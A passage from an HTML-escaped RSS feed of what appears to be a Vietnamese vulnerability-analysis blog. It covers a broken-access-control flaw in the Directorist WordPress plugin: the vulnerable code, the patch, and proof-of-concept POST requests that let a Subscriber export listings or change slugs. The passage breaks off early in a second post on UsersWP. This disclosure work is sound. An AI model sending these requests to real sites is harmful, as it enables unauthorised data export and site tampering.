hàm:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;File CSV được tạo tại thư mục upload của WordPress, ví dụ:&#xA;&lt;strong&gt;&lt;code&gt;wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau đó file được đăng ký dưới dạng &lt;strong&gt;attachment&lt;/strong&gt;, và WordPress tạo ra một &lt;strong&gt;URL truy cập công khai&lt;/strong&gt;, chính URL này được trả về trong &lt;code&gt;file_url&lt;/code&gt;, ví dụ:&#xA;&lt;strong&gt;&lt;code&gt;https://example.com/wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Danh sách các &lt;strong&gt;Directory Listings&lt;/strong&gt; có thể tìm thấy ở endpoint: &lt;code&gt;http://localhost/wp-admin/edit.php?post_type=at_biz_dir&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#34; title=&#34;Danh sách các Directory Listings&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/listing.png&#34; data-sub-html=&#34;&lt;h2&gt;Listing&lt;/h2&gt;&lt;p&gt;Danh sách các Directory Listings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#39; alt=&#34;Listing&#34; height=&#34;919&#34; width=&#34;1841&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách các Directory Listings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2. &lt;code&gt;wp_ajax_directorist_type_slug_change&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function directorist_type_slug_change() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;Session expired, please reload the window and try again.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    $type_id     = isset( $_POST[&amp;#39;type_id&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;type_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $update_slug = isset( $_POST[&amp;#39;update_slug&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;update_slug&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    $directory_slugs = [];&#xA;    $listing_types   = directorist_get_directories();&#xA;&#xA;    if ( $listing_types ) {&#xA;        foreach ( $listing_types as $listing_type ) {&#xA;            $directory_slugs[] = $listing_type-&amp;gt;slug;&#xA;            if ( $type_id == $listing_type-&amp;gt;term_id ) {&#xA;                $old_slug = $listing_type-&amp;gt;slug;&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    if ( in_array( $update_slug, $directory_slugs ) ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39;    =&amp;gt; __( &amp;#39;This slug already in use.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                &amp;#39;old_slug&amp;#39; =&amp;gt; ! empty( $old_slug ) ? $old_slug : &amp;#39;&amp;#39;,&#xA;            ]&#xA;        );&#xA;    } else {&#xA;        $update_type_slug = wp_update_term( $type_id, ATBDP_TYPE, [ &amp;#39;slug&amp;#39; =&amp;gt; $update_slug ] );&#xA;        if ( $update_type_slug ) {&#xA;            wp_send_json(&#xA;                [&#xA;                    &amp;#39;success&amp;#39; =&amp;gt; __( &amp;#39;Slug changes successfully.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                ]&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này cho phép thay đổi slug của bất kỳ Listing Type nào với &lt;code&gt;type_id&lt;/code&gt; và &lt;code&gt;update_slug&lt;/code&gt; được lấy từ POST request.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Để ý 1 tí, ta thấy cả 2 callback đều gọi đến &lt;code&gt;directorist_verify_nonce&lt;/code&gt; để triển khai cơ chế chống CSRF với action mặc định là &lt;code&gt;directorist_nonce&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function directorist_verify_nonce( $nonce_field = &amp;#39;directorist_nonce&amp;#39;, $action = &amp;#39;&amp;#39; ) {&#xA;    $nonce = ! empty( $_REQUEST[ $nonce_field ] ) ? directorist_clean( wp_unslash( $_REQUEST[ $nonce_field ] ) ) : &amp;#39;&amp;#39;;&#xA;    return wp_verify_nonce( $nonce, ( $action ? $action : directorist_get_nonce_key() ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nonce &lt;code&gt;directorist_nonce&lt;/code&gt; luôn tồn tại cho người dùng đã đăng nhập.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt; Người dùng đã đăng nhập (từ Subscriber trở lên) có thể gọi vào endpoint để thực hiện lấy danh sách các &lt;strong&gt;Directory Listings&lt;/strong&gt; hoặc thay đổi slug của bất kỳ Listing Type, dù hành động đó lẽ ra chỉ dành cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v8.5.3)&lt;/strong&gt; thêm kiểm tra quyền vào các callback bằng đoạn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;manage_atbdp_options&amp;#39; ) ) {&#xA;    wp_send_json_error(&#xA;        [&#xA;            &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to modify directory slugs.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;        ],&#xA;        403&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quyền &lt;code&gt;manage_atbdp_options&lt;/code&gt; là một &lt;strong&gt;custom capability&lt;/strong&gt;, được gán cho Administrator thông qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, &amp;#39;manage_atbdp_options&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nghĩa là chỉ Administrator mới có quyền thực thi các hành động như đổi slug hay xuất dữ liệu, khắc phục hoàn toàn lỗi thiếu capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Logged-in user (Subscriber or higher)&amp;#34;] --&amp;gt; B[&amp;#34;Send AJAX request to wp-admin/admin-ajax.php with action=directorist_prepare_listings_export_file or action=directorist_type_slug_change&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_* hook is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Is nonce valid?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Return error&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Process request&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is capability checked?&amp;#34;}&#xA;H -- No --&amp;gt; I[&amp;#34;Subscriber or higher can export all listings or change any directory slug&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Broken Access Control&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Login Subcriber account và lấy &lt;code&gt;directorist_nonce&lt;/code&gt; từ response&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#34; title=&#34;Lấy nonce từ response&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce từ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;670&#34; width=&#34;927&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce từ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy danh sách các &lt;strong&gt;Directory Listings&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_prepare_listings_export_file&amp;amp;directorist_nonce=22a1e53ab7&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Thay đổi slug của bất kỳ Listing Type&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost &#xA;Cookie: sub_cookie&#xA;...&#xA;action=directorist_type_slug_change&amp;amp;directorist_nonce=22a1e53ab7&amp;amp;type_id=580&amp;amp;update_slug=payload&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;Directorist &amp;lt;= 8.5.2&lt;/strong&gt; xuất phát từ việc &lt;strong&gt;không triển khai kiểm tra quyền hạn&lt;/strong&gt; trong hai AJAX action đặc quyền. Dù plugin có sử dụng nonce để chống CSRF, cơ chế này không đóng vai trò xác thực quyền, dẫn đến việc &lt;strong&gt;mọi người dùng đã đăng nhập&lt;/strong&gt;, bao gồm cả &lt;em&gt;Subscriber&lt;/em&gt;, đều có thể xuất toàn bộ dữ liệu Listing hoặc tùy ý thay đổi slug — những hành động lẽ ra chỉ dành cho Administrator.&#xA;Bản vá ở &lt;strong&gt;v8.5.3&lt;/strong&gt; khắc phục triệt để bằng cách bổ sung kiểm tra capability &lt;code&gt;manage_atbdp_options&lt;/code&gt;, thiết lập lại ranh giới truy cập đúng đắn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce không phải là kiểm tra quyền&lt;/strong&gt;: nonce chỉ ngăn CSRF, không ngăn người dùng cấp thấp thực thi thao tác nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;AJAX của WordPress là bề mặt tấn công phổ biến&lt;/strong&gt;: mọi &lt;code&gt;wp_ajax_&lt;/code&gt; cần kiểm tra capability rõ ràng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Broken Access Control thường đến từ việc thiếu một dòng kiểm tra&lt;/strong&gt;, không phải lỗi phức tạp.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Custom capability&lt;/strong&gt; (như &lt;code&gt;manage_atbdp_options&lt;/code&gt;) là cách hiệu quả để kiểm soát quyền chi tiết.&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra đồng thời &lt;strong&gt;xác thực người dùng&lt;/strong&gt; và &lt;strong&gt;quyền thực thi&lt;/strong&gt; trước khi cho phép thao tác quản trị.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/directorist/vulnerability/wordpress-directorist-plugin-8-5-2-missing-authorization-to-authenticated-subscriber-data-export-and-slug-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin &amp;lt;= 8.5.2 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-66072 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-12-cve-2025-66072/</link>
      <pubDate>Fri, 12 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-12-cve-2025-66072/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Missing Authorization&lt;/strong&gt; trong &lt;strong&gt;Stiofan UsersWP&lt;/strong&gt; cho phép khai thác &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;UsersWP&lt;/strong&gt;: từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 1.2.47&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-66072&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-66072&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.47&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.48&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/userswp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UsersWP&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.47&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.48&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;admin_init&amp;#39;, array( $this, &amp;#39;handle_bulk_user_type_change&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;admin_init&lt;/code&gt; chạy mỗi khi bất kỳ người dùng đã đăng nhập truy cập vào trang admin (&lt;code&gt;/wp-admin/&lt;/code&gt;), nhưng nó cũng được kích hoạt trong các endpoint như &lt;strong&gt;&lt;code&gt;admin-ajax.php&lt;/code&gt;&lt;/strong&gt; và &lt;strong&gt;&lt;code&gt;admin-post.php&lt;/code&gt;&lt;/strong&gt;. Vì các endpoint này cho phép truy cập cả từ Unauthenticated user, nên trong một số điều kiện, Unauthenticated user 